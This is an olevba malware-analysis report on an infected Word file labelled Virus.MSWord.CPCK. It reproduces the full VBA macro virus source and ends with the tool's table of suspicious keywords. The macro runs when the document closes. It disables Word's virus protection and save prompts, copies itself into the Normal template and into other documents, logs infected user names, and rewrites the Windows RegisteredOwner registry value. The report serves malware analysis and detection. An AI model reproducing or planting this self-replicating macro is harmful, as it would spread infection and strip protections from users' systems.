olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CPCK-based-ff90e26c91391fd1ad647e115f137811c974b50e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CPCK-based-ff90e26c91391fd1ad647e115f137811c974b50e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Close()
'Replication SystemRSDOC7.DOCDOC7.DOC07/09/01 20:30:27
On Error Resume Next
'Replication SystemRSDOC7.DOCDOC7.DOC07/09/01 20:30:27
Options.ConfirmConversions = 0
'Replication SystemRSDOC7.DOCDOC7.DOC07/09/01 20:30:27
Options.VirusProtection = 0
'Replication SystemRSDOC7.DOCDOC7.DOC07/09/01 20:30:27
SK5 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'Replication SystemRSDOC7.DOCDOC7.DOC07/09/01 20:30:27
Options.SaveNormalPrompt = 0
'Replication SystemRSDOC7.DOCDOC7.DOC07/09/01 20:30:27
VJ65 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'Replication SystemRSDOC7.DOCDOC7.DOC07/09/01 20:30:27
Application.EnableCancelKey = 0
'Replication SystemRSDOC7.DOCDOC7.DOC07/09/01 20:30:27
If VJ65 > 0 And SK5 > 0 Then GoTo SO52
'Replication SystemRSDOC7.DOCDOC7.DOC07/09/01 20:30:27
If VJ65 = 0 Then
'Replication SystemRSDOC7.DOCDOC7.DOC07/09/01 20:30:27
Set UQ53 = ActiveDocument.VBProject.VBComponents.Item(1)
'Replication SystemRSDOC7.DOCDOC7.DOC07/09/01 20:30:27
FQ12 = True
'Replication SystemRSDOC7.DOCDOC7.DOC07/09/01 20:30:27
End If
'Replication SystemRSDOC7.DOCDOC7.DOC07/09/01 20:30:27
If SK5 = 0 Then
'Replication SystemRSDOC7.DOCDOC7.DOC07/09/01 20:30:27
Set UQ53 = NormalTemplate.VBProject.VBComponents.Item(1)
'Replication SystemRSDOC7.DOCDOC7.DOC07/09/01 20:30:27
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines, "' ****** " & Application.UserName & " was infected " & Now & vbCr
'Replication SystemRSDOC7.DOCDOC7.DOC07/09/01 20:30:27
VJ65 = VJ65 + 2
'Replication SystemRSDOC7.DOCDOC7.DOC07/09/01 20:30:27
LJ4 = True
'Replication SystemRSDOC7.DOCDOC7.DOC07/09/01 20:30:27
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "retha"
'Replication SystemRSDOC7.DOCDOC7.DOC07/09/01 20:30:27
End If
'Replication SystemRSDOC7.DOCDOC7.DOC07/09/01 20:30:27
If LJ4 <> True And FQ12 <> True Then GoTo SO52
'Replication SystemRSDOC7.DOCDOC7.DOC07/09/01 20:30:27
If LJ4 = True Then UQ53.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, VJ65 - 1))
'Replication SystemRSDOC7.DOCDOC7.DOC07/09/01 20:30:27
If FQ12 = True Then UQ53.CodeModule.AddFromString ("Sub Document_Close()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, SK5 - 1))
'Replication SystemRSDOC7.DOCDOC7.DOC07/09/01 20:30:27
With UQ53.CodeModule
'Replication SystemRSDOC7.DOCDOC7.DOC07/09/01 20:30:27
For x = 2 To (UQ53.CodeModule.CountOfLines - 1) Step 2
'Replication SystemRSDOC7.DOCDOC7.DOC07/09/01 20:30:27
.replaceline x, "'" & Application.UserName & Application.UserInitials & Application.ActiveWindow & Application.ActiveDocument & Application.ActivePrinter & Now
'Replication SystemRSDOC7.DOCDOC7.DOC07/09/01 20:30:27
Next x
'Replication SystemRSDOC7.DOCDOC7.DOC07/09/01 20:30:27
End With
'Replication SystemRSDOC7.DOCDOC7.DOC07/09/01 20:30:27
SO52:
'Replication SystemRSDOC7.DOCDOC7.DOC07/09/01 20:30:27
If SK5 <> 0 And VJ65 = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Replication SystemRSDOC7.DOCDOC7.DOC07/09/01 20:30:27
' ****** Sai B. Benavente was infected 01/27/2000 2:13:17 PM
'Replication SystemRSDOC7.DOCDOC7.DOC07/09/01 20:30:27
' ****** MACRO was infected 1/8/2000 6:51:36 PM
'Replication SystemRSDOC7.DOCDOC7.DOC07/09/01 20:30:27
' ****** Ditry PC was infected 2/28/2000 12:20:53 PM
'Replication SystemRSDOC7.DOCDOC7.DOC07/09/01 20:30:27
' ****** Replication System was infected 07/09/01 20:30:03
'Replication SystemRSDOC7.DOCDOC7.DOC07/09/01 20:30:27
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

